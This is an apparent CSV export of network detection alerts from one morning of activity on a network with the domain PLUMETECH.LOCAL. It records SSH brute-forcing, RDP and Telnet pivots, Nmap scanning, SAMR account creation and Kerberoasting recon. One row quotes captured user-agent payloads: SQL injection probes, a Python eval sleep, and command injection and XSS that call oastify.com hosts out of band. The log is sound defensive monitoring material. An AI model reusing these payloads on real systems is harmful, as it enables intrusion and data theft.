SEVERITY,ID,OCCURRED_AT,TYPE,DETECTION_QUADS,SUMMARY,CONTENT,DETECTION,ASSET_IDS,SOURCE_HOST_NAME,DESTINATION_HOST_NAME,SOURCE_IP,DESTINATION_IP,OTHER_IP,SOURCE,PACKET_CAPTURE_STATE
Low,30062,2025-03-28T09:28:43Z,Communication,Configuration,Detected 13 NewSMBTraffic between 2025-03-28T09:13:46.229Z and 2025-03-28T09:28:43.289Z,"Sample NewSMBTraffic values include:
  dst__port: ('',);
  dst_asset_id: 1829, 1725, 45, 1916, 1772, 1746, 1784, 154, 1704, 1921;
  uuid: 795b1df6-a68a-4d4c-a011-81e6c00634a2, 09608805-9a63-4571-9048-7d7dda3e2343, f60133ab-26bc-4de0-bee0-0a6f0bf97361, 225d8dd8-a967-4b94-b91c-cab7e77f1375, 93b0fe16-a160-4d5c-bb64-33462ad25dd2, 8f3d4692-ac47-497e-af1e-12fccdb68863, 75ae4e99-8e5d-4e8e-99c1-2d435fc05400, e3ddc142-cac6-4e5c-a945-035e90026b3d, 259b8d04-90c6-4aed-aceb-8ba8c10eb26b, 9633be28-2705-4686-ac28-b38130815c42;
  src__mac: ;
  dst__mac: ;
  log_type: SMB_FileInfo, SMB_TreeInfo;
  protocol: ;
  versions: , SMB2, UNKNOWN, SMB1;
  src_asset_id: 1680, 1905, 1898, 50, 1936, 1916, 1914, 1729, 1933, 151;
  dst__ip: ;
  src__port: ('',);
  src__ip: ;",New SMB Communication Detection,"1936,1704,1921,1680,1914,1746,151,1905,1898,45,1772,1933,1725,1916,154,50,1729,1829,1784",,,"10.0.5.30,10.0.7.29,10.0.7.30,10.0.1.30,10.0.4.30,10.0.6.30,10.0.11.30,10.0.8.30,10.0.2.29,10.0.9.29","10.0.5.29,10.0.9.30,10.0.6.29,10.0.1.11,10.0.7.11,10.0.11.29,10.0.8.30,10.0.2.30,10.0.4.12,10.0.8.12",,"795b1df6-a68a-4d4c-a011-81e6c00634a2, 09608805-9a63-4571-9048-7d7dda3e2343, f60133ab-26bc-4de0-bee0-0a6f0bf97361, 225d8dd8-a967-4b94-b91c-cab7e77f1375, 93b0fe16-a160-4d5c-bb64-33462ad25dd2, 8f3d4692-ac47-497e-af1e-12fccdb68863, 75ae4e99-8e5d-4e8e-99c1-2d435fc05400, e3ddc142-cac6-4e5c-a945-035e90026b3d, 259b8d04-90c6-4aed-aceb-8ba8c10eb26b, 9633be28-2705-4686-ac28-b38130815c42",
Medium,30079,2025-03-28T09:30:03Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1921,1729",,,10.0.9.30,10.0.9.29,,Network Traffic,
Medium,30080,2025-03-28T09:30:03Z,Indicator,Indicator,WinRM wsman Access,WinRM wsman Access,WinRM Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
Low,30166,2025-03-28T09:38:52Z,Communication,Configuration,Detected 13 NewX509Certificate between 2025-03-28T09:30:44.778Z and 2025-03-28T09:38:52.445Z,"Sample NewX509Certificate values include:
  server: 142.250.186.67, 40.126.31.71, 162.159.134.233, 162.159.134.232, 162.159.138.232, 151.101.194.137, 10.0.9.11, 172.217.18.3, 162.159.129.233, 142.250.186.138;
  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
  not_before: , 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z;
  server_asset_id: 1732, 364, 3600, 3606, 3603, 3607, 3705, 3596, 3598, 3601;
  dst__port: ('',);
  dns: ;
  uuid: ebad8689-03f1-4304-bad2-a123e46234e8, 032e0d94-508b-491f-8f23-b8891f8d908c, 87205bba-1dac-44b6-8527-cf25e80132e7, bb44922e-532d-4e01-a027-6d96f44ba115, 46705af8-6c29-463b-bd17-e07ad43915b9, 56cff5fb-ac21-4b9a-b71a-c63ff2cfb7c1, bcad4b8b-c209-4015-8234-9c725b450cca, 2d9cee3f-63c5-4a73-a4c1-96739db7da98, fb1d46a9-307e-4d42-97a6-e5d6b3ddcd01, e1c29aa5-05da-4eca-9f87-9e7e256844d3;
  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
  client_asset_id: 1905, 1725, 50, 1916, 1921;
  src__mac: ;
  not_after: , 2025-09-16T23:59:59Z, 2026-03-27T01:24:33Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.9.30, 10.0.11.29, 10.0.4.30, 10.0.8.30, 10.0.2.29;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"1905,1916,1732,1725,3603,364,3600,3606,3607,3705,3596,3598,3601,50,1921",,,"10.0.9.11,142.250.186.138,20.190.159.130,18.198.149.116,151.101.130.137,162.159.129.233,162.159.138.232,172.217.18.3,142.250.186.67,40.126.31.71","10.0.4.30,10.0.8.30,10.0.11.29,10.0.2.29,10.0.9.30",,"ebad8689-03f1-4304-bad2-a123e46234e8, 032e0d94-508b-491f-8f23-b8891f8d908c, 87205bba-1dac-44b6-8527-cf25e80132e7, bb44922e-532d-4e01-a027-6d96f44ba115, 46705af8-6c29-463b-bd17-e07ad43915b9, 56cff5fb-ac21-4b9a-b71a-c63ff2cfb7c1, bcad4b8b-c209-4015-8234-9c725b450cca, 2d9cee3f-63c5-4a73-a4c1-96739db7da98, fb1d46a9-307e-4d42-97a6-e5d6b3ddcd01, e1c29aa5-05da-4eca-9f87-9e7e256844d3",
Low,30349,2025-03-28T08:37:03Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"2896,1921",,,10.0.242.127,10.0.9.30,,8e1fff44-3b82-4d94-8a8e-79a907936b19,
Low,31507,2025-03-28T08:54:47Z,Communication,Configuration,New Global User Agent,User Agent 'Python PSRP Client' was seen in the environment for the first time. Originating from asset 1921 (10.0.9.30) to 10.0.9.11 (10.0.9.11).,User Agent First Seen Globally,"1921,1732",,,10.0.9.30,10.0.9.11,,0018f5ce-2564-4391-bb5b-ce6d61217bb7,
Low,31508,2025-03-28T08:55:09Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.11 (1732) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (devel), selected protocol (), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1732",,,10.0.9.11,10.0.9.30,,,
Low,31510,2025-03-28T08:45:25Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.11 (1732) to host 10.0.9.30 (1921). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1732",,,10.0.9.11,10.0.9.30,,,
Low,31511,2025-03-28T08:55:09Z,Communication,Configuration,RDP New Comms,"New RDP communication profile from host 10.0.9.30 (1921) to host 10.0.9.11 (1732). If unencrypted, may also include the RDP cookie (), selected protocol (hybrid_ex), client_name (), and keyboard_layout ().",RDP New Comms Pattern,"1921,1732",,,10.0.9.30,10.0.9.11,,,
Low,32266,2025-03-28T09:54:47Z,Communication,Indicator,Failed HTTP Logon,"Asset 1732 (10.0.9.11) returned an HTTP response code of 401 'Unauthorized' to asset 1921 (10.0.9.30), which represents a failed logon attempt via HTTP by asset 1921. Logon attempts that result in HTTP status codes such as 401 'Unauthorized', 403 'Forbidden', or 407 'Proxy Authentication Required' can occur legitimately when users mistype credentials or attempt to access resources they are not authorized to use; however, they can also be indicative of malicious activities, such as unauthorized access attempts, brute force attacks, or the misuse of stolen credentials, where adversaries are testing access controls and trying to gain illicit entry into systems.",HTTP Auth Failure,"1732,1921",,,10.0.9.11,10.0.9.30,,d21c69f6-2204-4743-a27c-806ecb4d7aa1,
Low,32285,2025-03-28T09:51:50Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,e8ea1b62-23d4-4289-8078-e701d3d7152c,
Medium,32351,2025-03-28T10:07:14Z,Indicator,Indicator,Python PSRP Client User-Agent,Python PSRP Client User-Agent,Python User Agent Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
Low,32382,2025-03-28T10:12:21Z,Communication,Configuration,Detected 15 RDP New Comms between 2025-03-28T10:05:23.034Z and 2025-03-28T10:12:21.983Z,"Sample RDP New Comms values include:
  rdp_client_name: ;
  dst__port: ('',);
  ip_src: 10.0.9.30, 10.0.3.29, 10.0.10.30, 10.0.9.44, 10.0.3.12, 10.0.10.11, 10.0.3.30;
  dst_asset_id: 1896, 1709, 1727, 1801, 1919, 1735, 1921, 1791;
  rdp_keyboard_layout: ;
  ip_dst: 10.0.9.30, 10.0.3.29, 10.0.10.30, 10.0.9.44, 10.0.3.12, 10.0.10.11, 10.0.10.29, 10.0.3.30;
  rdp_selected_protocol: , hybrid, hybrid_ex, rds_tls;
  src__mac: ;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1896, 1709, 1727, 1919, 1921, 1735, 1791;
  dst__ip: ;
  src__port: ('',);
  rdp_rt_cookie: , nmap, alice, devel;
  src__ip: ;",RDP New Comms Pattern,"1896,1709,1791,1727,1919,1921,1735,1801",,,"10.0.3.30,10.0.3.29,10.0.3.12,10.0.9.44,10.0.10.30,10.0.9.30,10.0.10.11","10.0.3.30,10.0.3.29,10.0.3.12,10.0.9.44,10.0.10.30,10.0.9.30,10.0.10.11,10.0.10.29",,,
Low,32385,2025-03-28T10:09:46Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,c4a9bc53-504f-4dea-a45c-1fefa3541fa3,
Low,32394,2025-03-28T10:04:15Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,e170fd30-0490-4a02-a84b-e4a4e3a9cf23,
Low,32395,2025-03-28T10:04:15Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,9608d2d8-4c0e-45a3-aae4-c85ccb52eea3,
Low,32399,2025-03-28T10:00:36Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.45.,SSH Authentication Failure,"2896,1820",,,10.0.242.127,10.0.9.45,,28315053-ddf8-47be-bd91-eed29ba8ba2d,
Low,32410,2025-03-28T08:49:31Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,6050649a-2aed-449b-a4eb-a56f4fab67c1,
Low,32565,2025-03-28T10:03:48Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1732 (10.0.9.11) via RDP.,Interactive Session Pivots,"1732,2896",,,10.0.242.127,10.0.9.11,,,
Low,32623,2025-03-28T10:18:42Z,Indicator,Threat Behavior,SMB2 IOCTL Request DCERPC SAMR CreateUser - possible persistence,SMB2 IOCTL Request DCERPC SAMR CreateUser - possible persistence,SMB Windows Account Create,"1729,1732",,,10.0.9.29,10.0.9.11,,Network Traffic,
High,32634,2025-03-28T10:24:09Z,Indicator,Indicator,Nmap - SIP Request,Nmap - SIP Request,Nmap Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
High,32638,2025-03-28T10:24:08Z,Indicator,Indicator,Nmap - RDP Cookie,Nmap - RDP Cookie,Nmap Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
High,32639,2025-03-28T10:24:59Z,Indicator,Indicator,Nmap - HTTP URI Request from Nmap Scanner,Nmap - HTTP URI Request from Nmap Scanner,Nmap Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
Medium,32645,2025-03-28T10:24:57Z,Indicator,Threat Behavior,HTTP Request /etc/passwd,HTTP Request /etc/passwd,HTTP Hunting Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
Low,32654,2025-03-28T10:28:31Z,Indicator,Threat Behavior,SMB2 IOCTL Request DCERPC SAMR OpenGroup Domain Admins,SMB2 IOCTL Request DCERPC SAMR OpenGroup Domain Admins,Net.exe Command Signatures,"1729,1732",,,10.0.9.29,10.0.9.11,,Network Traffic,
Low,32702,2025-03-28T10:26:16Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 1921 (10.0.9.30) connected via SSH to asset 1732 (10.0.9.11) to then pivot to asset 1729 (10.0.9.29) via RDP.,Interactive Session Pivots,"1729,1921",,,10.0.9.30,10.0.9.29,,,
Low,32705,2025-03-28T10:16:08Z,Communication,Threat Behavior,Interactive Session Pivot,Asset 2896 (10.0.242.127) connected via SSH to asset 1921 (10.0.9.30) to then pivot to asset 1854 (10.0.9.12) via TELNET.,Interactive Session Pivots,"2896,1854",,,10.0.242.127,10.0.9.12,,,
Low,32706,2025-03-28T10:22:24Z,Communication,Configuration,RDP New Cookie,New RDP cookie a from host 10.0.9.29 (asset 1729) to host 10.0.9.30 (asset 1921).,RDP New Cookie,"1729,1921",,,10.0.9.29,10.0.9.30,,,
Low,32707,2025-03-28T10:20:35Z,Communication,Configuration,RDP New Cookie,New RDP cookie admin from host 10.0.9.12 (asset 1854) to host 10.0.9.30 (asset 1921).,RDP New Cookie,"1921,1854",,,10.0.9.12,10.0.9.30,,,
Medium,32709,2025-03-28T10:24:09Z,Communication,Threat Behavior,RDP Nonstandard Port,"An RDP negotiated connection was observed between Asset 1921 (10.0.9.30:39926) and Asset 1854 (10.0.9.12:445) using a non-standard port. RDP enables endpoints to negotiate certain configurations while establishing a session, including the specification of preferred / alternate ports. Attackers commonly use non-standard ports to evade detection and bypass security controls like network connection filtering.",RDP Nonstandard Port,"1921,1854",,,10.0.9.30,10.0.9.12,,98db5c4d-4326-47e3-b278-ccfad5d21775,
Low,32710,2025-03-28T10:20:40Z,Communication,Configuration,Detected 14 NewX509Certificate between 2025-03-28T10:09:43.755Z and 2025-03-28T10:20:40.228Z,"Sample NewX509Certificate values include:
  server: 104.83.120.20, 185.199.108.133, 20.86.201.138, 20.44.10.123, 104.126.37.186, 216.58.212.170, 51.11.192.50, 142.250.185.170, 104.126.37.137, 140.82.112.21;
  subject: , C=US, ST=WA, L=Redmond, O=Microsoft Corporation, CN=arc.msn.com;
  not_before: , 2025-03-09T16:45:25Z;
  server_asset_id: 3809, 3807, 3579, 2820, 3800, 3803, 3805, 3782, 3602, 3804;
  dst__port: ('',);
  dns: ;
  uuid: 65f8914d-1c82-4fe1-bd4a-1baa4dfbd581, 8cdee813-9716-447c-857a-58fb3305de97, 978eec14-53c6-4691-a366-f979a360b7eb, ce836910-abc8-4d8e-9196-3667b39ce3a0, 530c727a-afde-4efc-8932-c8368340e11e, 10b5dc2a-dd69-480b-8d6e-2b22329b43ea, 80eebac8-5eb3-438c-833e-d9704899b823, bb9c42cf-c11c-4955-a48f-05ad2a37a655, 98dcd21c-bfcb-43cd-b3b9-63115e279b9c, 6e35ebe0-0b64-47f5-98fc-c005a37c9717;
  issuer: , C=US, O=Microsoft Corporation, CN=Microsoft Azure RSA TLS Issuing CA 03;
  client_asset_id: 1921, 44, 1709, 1746;
  src__mac: ;
  not_after: , 2025-09-05T16:45:25Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.9.30, 10.0.1.29, 10.0.6.29, 10.0.3.29;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"1921,3809,3807,3579,2820,3800,3803,3805,3782,3602,3804,44,1709,1746",,,"20.44.10.123,142.250.185.170,185.199.108.133,20.190.160.22,104.83.120.20,51.11.192.50,216.58.212.170,184.25.50.72,116.203.101.164,20.86.201.138","10.0.9.30,10.0.1.29,10.0.3.29,10.0.6.29",,"65f8914d-1c82-4fe1-bd4a-1baa4dfbd581, 8cdee813-9716-447c-857a-58fb3305de97, 978eec14-53c6-4691-a366-f979a360b7eb, ce836910-abc8-4d8e-9196-3667b39ce3a0, 530c727a-afde-4efc-8932-c8368340e11e, 10b5dc2a-dd69-480b-8d6e-2b22329b43ea, 80eebac8-5eb3-438c-833e-d9704899b823, bb9c42cf-c11c-4955-a48f-05ad2a37a655, 98dcd21c-bfcb-43cd-b3b9-63115e279b9c, 6e35ebe0-0b64-47f5-98fc-c005a37c9717",
Low,32720,2025-03-28T10:28:49Z,Communication,Configuration,Detected 16 RDP New Comms between 2025-03-28T10:12:23.444Z and 2025-03-28T10:28:49.126Z,"Sample RDP New Comms values include:
  rdp_client_name: ;
  dst__port: ('',);
  ip_src: 10.0.9.30, 10.0.9.44, 10.0.9.12, 10.0.9.11, 10.0.2.11, 10.0.9.29;
  dst_asset_id: 1732, 1727, 154, 1729, 1854, 1921;
  rdp_keyboard_layout: ;
  ip_dst: 10.0.9.30, 10.0.9.44, 10.0.9.12, 10.0.9.11, 10.0.9.29, 10.0.2.30;
  rdp_selected_protocol: , hybrid, hybrid_ex;
  src__mac: ;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1732, 48, 1727, 1729, 1854, 1921;
  dst__ip: ;
  src__port: ('',);
  rdp_rt_cookie: , admin, plumber, a, nmap, alice, devel;
  src__ip: ;",RDP New Comms Pattern,"1729,1921,1854,48,154,1732,1727",,,"10.0.9.29,10.0.9.30,10.0.9.12,10.0.2.11,10.0.9.11,10.0.9.44","10.0.9.29,10.0.9.30,10.0.9.12,10.0.2.30,10.0.9.11,10.0.9.44",,,
Low,32727,2025-03-28T10:28:34Z,Asset,Configuration,Detected 99 NewUserAgent between 2025-03-28T10:11:04.405Z and 2025-03-28T10:28:34.138Z,"Sample NewUserAgent values include:
  dst__port: ('',);
  uuid: d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a;
  src__mac: ;
  src_ip: 10.0.5.29, 10.0.7.30, 10.0.3.29, 10.0.10.30, 10.0.4.30, 10.0.9.12, 10.0.9.29, 10.0.5.30, 10.0.12.30;
  dst__mac: ;
  protocol: ;
  src_asset_id: 1905, 1704, 1709, 1910, 1936, 1919, 1729, 1854, 1914;
  dst__ip: ;
  src__port: ('',);
  user_agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and '1431'='1437, Microsoft BITS/7.8, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36|nslookup -q=cname whhfxx2jaihwv5vs1umn2di8xz3srjff3aq0ep.oastify.com.&, eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single')), Microsoft-CryptoAPI/10.0, '""><svg/onload=fetch`//ke23ulz776ekstsgyijbz1fwun0go6cy2mx9nxc\.oastify.com`>, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'""`0&nslookup -q=cname hwh0cih4p3whaqadgf18hyxtckie64u1iw5mtb.oastify.com.&`', Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 9194=9196--, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36erros%>j8fd7'/""<ylbim, Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36' and 7859=7859--;
  src__ip: ;",User Agent First Seen,"1729,1854,1709,1919,1914,1910,1704,1905,1936",,,,,"10.0.9.29,10.0.9.12,10.0.3.29,10.0.10.30,10.0.7.30,10.0.12.30,10.0.5.29,10.0.4.30,10.0.5.30","d066c38c-bb09-4267-acc8-d8ee18f29432, 98ce215e-4b7b-4256-8d26-138c63febaf4, b648477d-3426-4ed4-89ea-a3c7e8273557, d153c4a4-97a4-4ca1-ae2f-6ce504219d98, 002a480d-0dd4-4b6b-a39d-d7fd168138ad, 09549c5a-d8e8-4738-bda2-5e7a8c0a3c2b, 149a9954-d612-4c62-a59a-77a41114074c, c9b8a9ec-c68b-4d55-a33f-7628d3796d40, 625653ba-b2d4-43d1-ba26-703b5cefb4cc, 7302f785-7398-4ea0-b9c2-1ffe872dea9a",
Low,32746,2025-03-28T08:59:43Z,Communication,Configuration,SSH Authentication Failure,SSH authentication failure from 10.0.242.127 to 10.0.9.30.,SSH Authentication Failure,"1921,2896",,,10.0.242.127,10.0.9.30,,d8502eac-9333-4031-9ebe-f09c0deaf335,
Low,32771,2025-03-28T10:24:59Z,Communication,Configuration,New SMB Communication detected,New SMB_FileInfo (version: ) traffic between Asset:1921 and Asset:1854,New SMB Communication Detection,"1921,1854",,,10.0.9.30,10.0.9.12,,663ecfd8-72cd-4498-9f81-f0944fb4abd7,
Low,32772,2025-03-28T10:28:25Z,Communication,Configuration,New SMB Communication detected,"New SMB_FileInfo (version: ['SMB1', 'SMB2']) traffic between Asset:1729 and Asset:1854",New SMB Communication Detection,"1729,1854",,,10.0.9.29,10.0.9.12,,1fa3bbda-7dd2-4da5-afb4-cd4b3e1e15d8,
Low,32775,2025-03-28T10:29:56Z,Indicator,Indicator,HTTP Request for .hta File,HTTP Request for .hta File,HTTP Request for File Extension,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
Low,32776,2025-03-28T10:30:12Z,Indicator,Threat Behavior,HTTP URI CLI Command netstat,HTTP URI CLI Command netstat,HTTP Hunting CLI Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
Low,32777,2025-03-28T10:29:56Z,Indicator,Threat Behavior,HTTP Request .bash_history,HTTP Request .bash_history,HTTP Hunting Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
Low,32783,2025-03-28T10:30:22Z,Indicator,Threat Behavior,HTTP URI CLI Command wget,HTTP URI CLI Command wget,HTTP Hunting CLI Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
Low,32784,2025-03-28T10:30:02Z,Indicator,Threat Behavior,HTTP URI CLI Command crontab,HTTP URI CLI Command crontab,HTTP Hunting CLI Signatures,"1921,1854",,,10.0.9.30,10.0.9.12,,Network Traffic,
Low,32799,2025-03-28T10:31:08Z,Indicator,Threat Behavior,LDAP Request ServicePrincipalName Accounts - Kerberoasting Possible,LDAP Request ServicePrincipalName Accounts - Kerberoasting Possible,LDAP Based Recon,"1921,1732",,,10.0.9.30,10.0.9.11,,Network Traffic,
Low,32827,2025-03-28T10:40:50Z,Communication,Configuration,Detected 6 NewSMBTraffic between 2025-03-28T10:33:27.605Z and 2025-03-28T10:40:50.630Z,"Sample NewSMBTraffic values include:
  dst__port: ('',);
  dst_asset_id: 1721, 1868, 1919, 1854, 1697, 135;
  uuid: cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5;
  src__mac: ;
  dst__mac: ;
  log_type: SMB_FileInfo, SMB_TreeInfo;
  protocol: ;
  versions: , SMB2, SMB1;
  src_asset_id: 48, 1910, 1801, 1729, 1933, 1704;
  dst__ip: ;
  src__port: ('',);
  src__ip: ;",New SMB Communication Detection,"48,1910,1801,1729,1933,1704,1721,1868,1919,1854,1697,135",,,"10.0.2.11,10.0.12.30,10.0.10.29,10.0.9.29,10.0.11.30,10.0.5.29","10.0.11.12,10.0.12.12,10.0.10.30,10.0.9.12,10.0.5.12,10.0.2.43",,"cb825ada-bbcf-4219-ad75-057d7c55e487, acaf527d-4b97-43ad-b4ef-34fbc33e3e77, a6a8c16a-b366-42c3-8bd4-43c3050a4441, bbffa1db-60ab-4510-8b41-a5db113bc83e, 9920da0f-7331-4261-b8a4-db884e05fede, c5dd6e3e-2c81-43f1-87de-c043210a9bd5",
Low,32831,2025-03-28T10:37:39Z,Communication,Configuration,Detected 21 NewX509Certificate between 2025-03-28T10:26:38.369Z and 2025-03-28T10:37:39.407Z,"Sample NewX509Certificate values include:
  server: 23.3.89.120, 23.11.206.112, 23.11.206.104, 142.250.185.138, 184.25.50.200, 98.64.238.3, 40.126.31.2, 104.208.16.92, 23.32.238.99, 23.32.238.96;
  subject: , CN=DC1.PLUMETECH.LOCAL, C=US, ST=Washington, L=Redmond, O=Microsoft Corporation, CN=login.live.com;
  not_before: , 2025-03-16T00:00:00Z, 2025-03-27T01:24:33Z;
  server_asset_id: 3811, 1772, 3831, 3825, 3830, 1779, 3817, 3828, 3816, 3785;
  dst__port: ('',);
  dns: ;
  uuid: 460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb;
  issuer: , DC=LOCAL, DC=PLUMETECH, CN=PLUMETECH-DC1-CA, C=US, O=DigiCert Inc, CN=DigiCert SHA2 Secure Server CA;
  client_asset_id: 1905, 48, 1916, 1746, 1729, 1704, 1914;
  src__mac: ;
  not_after: , 2025-09-16T23:59:59Z, 2026-03-27T01:24:33Z;
  dst__mac: ;
  protocol: ;
  dst__ip: ;
  client: 10.0.5.29, 10.0.6.29, 10.0.7.30, 10.0.4.30, 10.0.8.30, 10.0.2.11, 10.0.9.29;
  src__port: ('',);
  src__ip: ;",X509 Certificate First Seen,"1914,1772,48,1729,1704,1916,1905,3831,3830,3825,3828,3811,1779,3817,3816,3785,1746",,,"10.0.7.11,184.25.50.161,20.189.173.24,98.64.238.3,40.90.65.40,23.3.89.120,10.0.8.11,23.11.206.98,184.25.50.200,23.11.206.112","10.0.7.30,10.0.2.11,10.0.9.29,10.0.5.29,10.0.8.30,10.0.4.30,10.0.6.29",,"460dcfbb-9296-407b-91de-bebe9236da07, 4b8c0dd7-15de-45ea-8cfa-6434c4569602, a653a156-4bbb-4ee1-bfc8-1bb338f138d5, 9b145ab0-7c6b-4522-b651-8d84cf539d10, e95bb3a7-a71f-4baf-b184-2f2916c03438, 3574d92a-fd5d-4f49-8c1d-465a54400b9e, 22f19f9c-ac3e-430d-8548-a10aa1cc7ae7, 05e7b917-662a-4129-b2bd-853486070fc7, e2e2895f-2de6-43ce-86e1-32bde3b5a4dc, d76c2ed4-c426-4225-933f-552b43af9acb",
